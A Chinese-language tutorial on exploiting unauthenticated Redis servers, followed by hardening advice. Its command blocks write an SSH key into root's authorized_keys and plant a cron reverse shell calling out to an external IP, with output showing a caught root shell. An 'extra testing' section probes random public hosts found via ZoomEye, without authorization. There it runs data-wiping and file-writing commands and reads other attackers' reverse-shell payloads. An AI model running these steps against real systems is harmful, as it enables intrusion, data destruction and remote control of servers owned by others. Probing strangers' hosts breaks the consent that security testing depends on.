# redis 入侵测试及防御策略

## 1 漏洞概述

- Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。

## 2 入侵测试
```
 cd /home/dh/.ssh
 登陆测试　ssh root@192.168.1.30
 (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > dh.txt
 cat dh.txt | redis-cli -h 192.168.1.30 -x set crackit
 redis-cli -h 192.168.1.30 CONFIG set dir /root/.ssh
 redis-cli -h 192.168.1.30 config set dbfilename "authorized_keys"
 redis-cli -h 192.168.1.30 save
 再登陆测试　ssh root@192.168.1.30
```
### 　利用redis 反弹shell


#### １　redis 非root 启动无权限　
```
这时候最多搞点数据破坏　flushall 
对其他操作基本上没有权限
dh@dh-pc ~ $ redis-cli -h 192.168.1.30 config set dir /var/spool/cron
(error) ERR Changing directory: Permission denied
dh@dh-pc ~ $ redis-cli -h 192.168.1.30
192.168.1.30:6379> config set dir /var/spool/cron
(error) ERR Changing directory: Permission denied
```

#### 2	redis root 启动有权限（centos 系列会反弹成功，debian 系列不会成功）
```
登陆vps:  nc -lvvp 22222 
开始操作
redis-cli -h 192.168.1.30 -p 6379 config set dir /var/spool/cron
redis-cli -h 192.168.1.30 -p 6379 config set dbfilename root
echo -e "\n\n\n* * * * * /bin/bash -i >& /dev/tcp/52.221.230.100/22222 0>&1\n\n\n" | redis-cli -h 192.168.1.30 -p 6379 -x set 1
redis-cli -h 192.168.1.30 -p 6379 save || redis-cli -h 192.168.1.30 -p 6379 bgsave 

- 然后观察刚刚登陆的vps终端
ubuntu@ip-172-31-31-79:~$ nc -lvvp 22222
Listening on [0.0.0.0] (family 0, port 22222)
Connection from [211.144.0.242] port 22222 [tcp/*] accepted (family 2, sport 33096)
[root@vv30-cimhealth ~]# 
[root@vv30-cimhealth ~]# ls
30iptables
anaconda-ks.cfg
```

## 3 防御策略

```
安全加固
1 防火墙　iptables -I INPUT -p TCP  --destination-port 6379 -s 192.168.0.0/16 -j ACCEPT
2 不暴露公网　　bind 10.1.1.2
3 配置文件修改，在redis.conf 中加入如下，防止redis-cli 中乱操作 
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command CONFIG ""
＃rename-command EVAL  ""
＃rename-command KEYS ""
４ 以最小权限启动redis
useradd redis -s /sbin/nologin -M
chown -R redis.redis /data0/redis
/usr/bin/redis-cli -h 10.170.175.113 save
cp -vf /data0/redis/6379/data/6379-dump.rdb  /data0/redis/6379/redis_backup/$(date +%Y%m%d)_redis_dump.rdb
sudo -u redis  /usr/bin/redis-server /data0/redis/6379/conf/redis-6379.conf
5 为redis 配置安全密码
在redis.conf 中配置requirepass mypassword
```

## 4 额外测试

```
打开　https://www.zoomeye.org port:6379
https://www.zoomeye.org/search?q=port%3A6379&t=host
查看到开放6379 端口的ip
随便抓几个测试
159.203.170.119
159.203.86.225
记录本次操作
redis-cli -h 159.203.86.225
info （查看到redis 主机信息及角色）
可以操作的权限很多
CONFIG GET (dir|dbfilename|logfile|pidfile)
CONFIG GET dir
set dh test
get dh test 
FLUSHALL (清空所有数据)
159.203.86.225:6379> CONFIG set dir /root
(error) ERR Changing directory: Permission denied
【此处是应该没有权限】
CONFIG SET dir /var
CONGIG SET dbfilename test.php
SET payload "could be php or shell or whatever"
BGSAVE

dh@dh-pc ~/.ssh $ redis-cli -h 159.224.49.116
159.224.49.116:6379> keys *
1) "crackit"
2) "ffxtsmcdhe"
3) "xgmhhvskps"
159.224.49.116:6379> get crackit
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAqwRhKmAIN47PYZVBAGF7+u5QuSJXRFBjJJYgy6lCoiuWQJP/Pum5fQnCiP8w9sb4UgIWM3roAV6iwB/hErdu5tvPuQd/6wc9NGswBgMJN1lsyeqYabyMw1L/vAJ7BKbGVKezTGeNIXYQDzcBFBDbcZCK2r0M01Yodl/HVLqo5Fs= root@PPOMailServer02\n\n\n\n"
(1.41s)
159.224.49.116:6379> get ffxtsmcdhe
"\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/115.89.238.178/31222 0>&1\n\n"
159.224.49.116:6379> get xgmhhvskps
"\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/115.89.238.178/31230 0>&1\n\n"
```

